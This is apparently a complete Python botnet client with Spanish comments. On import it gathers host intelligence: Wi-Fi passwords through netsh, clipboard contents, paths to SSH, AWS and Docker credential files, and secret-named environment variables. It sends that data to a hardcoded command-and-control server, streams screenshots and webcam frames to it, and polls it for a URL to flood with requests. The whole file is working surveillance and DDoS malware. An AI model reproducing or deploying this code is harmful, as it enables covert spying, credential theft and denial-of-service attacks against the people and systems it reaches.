import os
import sys
import json
import socket
import platform
import urllib.request
import threading
import time
import subprocess
import base64
from pathlib import Path

try:
    import pyautogui
except ImportError:
    pyautogui = None

try:
    import cv2
    import numpy as np
except ImportError:
    cv2 = None
    np = None

# =====================================================================
#                           CONFIGURACION C2
# =====================================================================

C2_URL = "http://10.200.2.134:3000"
TARGET_URL = None
ATTACKING = False

print(f"[!] BOT: C2 activo en {C2_URL}")

# =====================================================================
#                 FUNCIONES DE EXTRACCIÓN DE INTELIGENCIA
# =====================================================================

def get_environment_variables():
    env_secrets = {}
    keywords = ['api', 'token', 'key', 'secret', 'password', 'passwd', 'aws', 'auth', 'ssh']
    for k, v in os.environ.items():
        if any(kw in k.lower() for kw in keywords):
            env_secrets[k] = f"[{len(v)} chars]"
    return env_secrets

def get_sensitive_files():
    home = Path.home()
    sensitive_targets = {
        '.ssh/id_rsa':      'SSH Private Key (RSA)',
        '.ssh/known_hosts': 'SSH Known Hosts',
        '.aws/credentials': 'AWS Credentials',
        '.env':             '.env File',
        '.gitconfig':       'Git Config',
        '.npmrc':           '.npmrc (npm tokens)',
        '.docker/config.json': 'Docker credentials',
    }
    return [label for path, label in sensitive_targets.items() if (home / path).exists()]

def get_geolocation():
    try:
        with urllib.request.urlopen("http://ip-api.com/json/?fields=status,country,city,isp,query", timeout=3) as res:
            return json.loads(res.read().decode('utf-8'))
    except:
        return {"status": "fail", "reason": "No internet"}

def get_public_ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org", timeout=3) as res:
            return res.read().decode('utf-8').strip()
    except:
        return "N/A"

def get_wifi_ssids():
    networks = []
    try:
        if os.name == 'nt':
            out = subprocess.check_output(["netsh", "wlan", "show", "profiles"], text=True, stderr=subprocess.DEVNULL)
            for line in out.splitlines():
                if "All User Profile" in line or "Perfil de usuario" in line:
                    ssid = line.split(":")[-1].strip()
                    if ssid:
                        password = "N/A"
                        try:
                            # Using name="..." to correctly handle SSIDs with spaces
                            detail = subprocess.check_output(["netsh", "wlan", "show", "profile", f"name=\"{ssid}\"", "key=clear"], text=True, stderr=subprocess.DEVNULL)
                            for d_line in detail.splitlines():
                                if "Key Content" in d_line or "Contenido de la clave" in d_line:
                                    password = d_line.split(":")[-1].strip()
                                    break
                        except:
                            pass
                        networks.append(f"{ssid} (PW: {password})")
        elif os.path.exists("/usr/bin/nmcli"):
            out = subprocess.check_output(["nmcli", "-t", "-f", "SSID", "dev", "wifi"], text=True)
            networks = list(set([l.strip() for l in out.split('\n') if l.strip()]))[:10]
    except:
        pass
    return networks if networks else ["No WiFi profiles found"]

def get_open_ports():
    open_ports = []
    ports_to_test = [21, 22, 23, 25, 80, 443, 3306, 5432, 8080, 8443,
                     3000, 3001, 5000, 5001, 5173, 6379, 27017, 1433]
    for port in ports_to_test:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.1)
            if s.connect_ex(('127.0.0.1', port)) == 0:
                open_ports.append(port)
    return open_ports

def get_network_config():
    interfaces = {}
    try:
        hostname = socket.gethostname()
        interfaces[hostname] = socket.gethostbyname(hostname)
    except:
        pass
    return interfaces

def get_running_processes():
    try:
        if os.name == 'nt':
            out = subprocess.check_output(["tasklist", "/FO", "CSV", "/NH"], text=True, stderr=subprocess.DEVNULL)
            procs = []
            for line in out.strip().splitlines()[:20]:
                parts = line.strip('"').split('","')
                if len(parts) >= 2:
                    procs.append({"name": parts[0], "pid": parts[1]})
            return procs
        else:
            out = subprocess.check_output(["ps", "aux", "--no-header"], text=True)
            return [l.split()[10] for l in out.splitlines()[:15]]
    except:
        return []

def get_running_services():
    try:
        if os.name == 'nt':
            out = subprocess.check_output(
                ["sc", "query", "type=", "running"],
                text=True, stderr=subprocess.DEVNULL
            )
            services = []
            for line in out.splitlines():
                if "SERVICE_NAME" in line:
                    services.append(line.split(":")[-1].strip())
            return services[:15]
    except:
        pass
    return []

def get_active_windows():
    try:
        if os.name == 'nt':
            out = subprocess.check_output(
                ['powershell', '-command',
                 'Get-Process | Where-Object {$_.MainWindowTitle} | Select-Object -First 10 -ExpandProperty MainWindowTitle'],
                text=True, stderr=subprocess.DEVNULL
            )
            return [l.strip() for l in out.strip().splitlines() if l.strip()]
    except:
        pass
    return []

def get_clipboard_content():
    try:
        if os.name == 'nt':
            out = subprocess.check_output(
                ['powershell', '-command', 'Get-Clipboard'],
                text=True, stderr=subprocess.DEVNULL, timeout=2
            )
            content = out.strip()
            return content[:300] if content else "[empty]"
    except:
        pass
    return "[unavailable]"

def get_running_users():
    try:
        if os.name == 'nt':
            out = subprocess.check_output(["query", "user"], text=True, stderr=subprocess.DEVNULL)
            return [l.strip() for l in out.strip().splitlines()[1:] if l.strip()]
        else:
            out = subprocess.check_output(["who"], text=True)
            return [l.strip() for l in out.strip().splitlines()]
    except:
        return []

def get_installed_packages():
    try:
        return [p for p in sys.modules.keys() if not p.startswith('_')][:20]
    except:
        return []

def get_system_information():
    return {
        "platform":  platform.system(),
        "release":   platform.release(),
        "version":   platform.version(),
        "architecture": platform.machine(),
        "processor": platform.processor(),
        "cpu_count": os.cpu_count(),
    }

# =====================================================================
#                        ORQUESTACIÓN CENTRAL
# =====================================================================

def _collect_intel():
    try:
        hostname = socket.gethostname()
        username = os.getlogin()
    except:
        hostname, username = "unknown_host", "unknown_user"

    return {
        "bot_id":                f"{hostname}_{username}",
        "user":                  username,
        "hostname":              hostname,
        "os":                    os.name,
        "python_version":        sys.version.split()[0],
        "system_info":           get_system_information(),
        "public_ip":             get_public_ip(),
        "geolocation":           get_geolocation(),
        "network_config":        get_network_config(),
        "local_open_ports":      get_open_ports(),
        "wifi_ssids":            get_wifi_ssids(),
        "sensitive_files_found": get_sensitive_files(),
        "env_secrets_detected":  get_environment_variables(),
        "running_processes":     get_running_processes(),
        "running_services":      get_running_services(),
        "active_windows":        get_active_windows(),
        "clipboard_content":     get_clipboard_content(),
        "running_users":         get_running_users(),
        "python_modules_loaded": get_installed_packages(),
    }

def _encode_frame(frame_bgr, quality=60):
    """Convierte un frame BGR de OpenCV a base64 JPEG."""
    try:
        _, buffer = cv2.imencode('.jpg', frame_bgr, [cv2.IMWRITE_JPEG_QUALITY, quality])
        return base64.b64encode(buffer).decode()
    except:
        return None

def _capture_monitoring():
    """
    Loop continuo de captura de pantalla y cámara.
    Envía frames al C2 a ~10 FPS (0.1s).
    """
    bot_id = f"{socket.gethostname()}_{os.getlogin()}"
    
    cam = None
    if cv2:
        try:
            cam = cv2.VideoCapture(0)
            if not cam.isOpened():
                cam.release()
                cam = None
        except:
            cam = None

    try:
        while True:
            payload = {"bot_id": bot_id}

            # --- Captura pantalla ---
            if pyautogui:
                try:
                    from io import BytesIO
                    shot = pyautogui.screenshot()
                    if shot.mode in ('RGBA', 'P', 'LA'):
                        shot = shot.convert('RGB')
                    buf = BytesIO()
                    shot.save(buf, format="JPEG", quality=40)
                    payload["screenshot"] = base64.b64encode(buf.getvalue()).decode()
                except:
                    pass

            # --- Captura cámara ---
            if cam:
                try:
                    ret, cam_frame = cam.read()
                    if ret:
                        encoded_cam = _encode_frame(cam_frame, quality=50)
                        if encoded_cam:
                            payload["cam_frame"] = encoded_cam
                except:
                    pass

            # --- Captura portapapeles ---
            try:
                clipboard = get_clipboard_content()
                if clipboard:
                    payload["clipboard_content"] = clipboard
            except:
                pass

            # --- Envío al C2 ---
            if len(payload) > 1:
                _send_to_c2("exfiltrate", payload)

            # Intervalo entre frames para streaming (aprox 10 FPS)
            time.sleep(0.05)
    finally:
        if cam:
            cam.release()

# =====================================================================
#                       FUNCIONES DE COMUNICACION C2
# =====================================================================

def _send_to_c2(endpoint, payload):
    """Envía datos al C2 de forma síncrona."""
    try:
        req = urllib.request.Request(
            f"{C2_URL}/{endpoint}",
            data=json.dumps(payload).encode('utf-8'),
            headers={'Content-Type': 'application/json'},
            method='POST'
        )
        with urllib.request.urlopen(req, timeout=8) as resp:
            return json.loads(resp.read().decode('utf-8'))
    except:
        return None

def exfiltrate_intel():
    """Recolecta y envía el reporte de inteligencia completo."""
    intel = _collect_intel()
    result = _send_to_c2("exfiltrate", intel)
    if result:
        print(f"[+] Exfiltración OK")
    else:
        print(f"[-] Error al conectar con el C2")
    return intel

# =====================================================================
#                       CICLO DE VIDA DE LA BOTNET
# =====================================================================

def _attack_loop():
    global ATTACKING, TARGET_URL
    while ATTACKING and TARGET_URL:
        try:
            urllib.request.urlopen(TARGET_URL, timeout=0.5)
        except:
            pass
        time.sleep(0.1)

def _heartbeat_loop():
    global TARGET_URL, ATTACKING
    try:
        bot_id = f"{socket.gethostname()}_{os.getlogin()}"
    except:
        bot_id = "generic_bot"

    while True:
        try:
            data = {"bot_id": bot_id, "status": "ALIVE"}
            result = _send_to_c2("heartbeat", data)
            
            if result:
                # Si el servidor dice que no tiene nuestra info (ej. tras un reinicio), se la mandamos
                if result.get("needs_info"):
                    threading.Thread(target=exfiltrate_intel, daemon=True).start()

                new_target = result.get("target")
                if new_target and not ATTACKING:
                    TARGET_URL = new_target
                    ATTACKING = True
                    threading.Thread(target=_attack_loop, daemon=True).start()
                elif not new_target:
                    ATTACKING = False
                    TARGET_URL = None
        except:
            pass
        
        time.sleep(10)

# =====================================================================
#                         DISPARADORES AUTOMÁTICOS
# =====================================================================
try:
    # 1. Exfiltración inicial completa (síncrona) — envía todos los datos del sistema
    exfiltrate_intel()

    # 2. Loop continuo de captura: screenshot + cámara cada 5 segundos (daemon)
    threading.Thread(target=_capture_monitoring, daemon=True).start()

    # 3. Heartbeat loop persistente para recibir comandos
    threading.Thread(target=_heartbeat_loop, daemon=True).start()
except:
    pass